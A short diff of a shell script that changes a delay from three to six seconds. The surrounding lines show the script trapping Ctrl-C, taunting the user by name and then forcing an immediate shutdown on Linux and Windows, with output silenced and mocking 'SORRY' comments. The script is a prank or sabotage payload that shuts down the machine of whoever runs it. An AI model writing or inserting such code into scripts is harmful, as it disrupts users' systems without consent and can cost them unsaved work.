@@ -7,6 +7,6 @@ function ctrl_c() {
 }
 
 echo "Hi!! $(whoami) ,GOOD JOB BYEEEEE"
-sleep 3
+sleep 6
 shutdown now 2>/dev/null 1>/dev/null  # SORRY LINUX USER
 shutdown -s -t 0 # SORRY WINDOWS USER :(
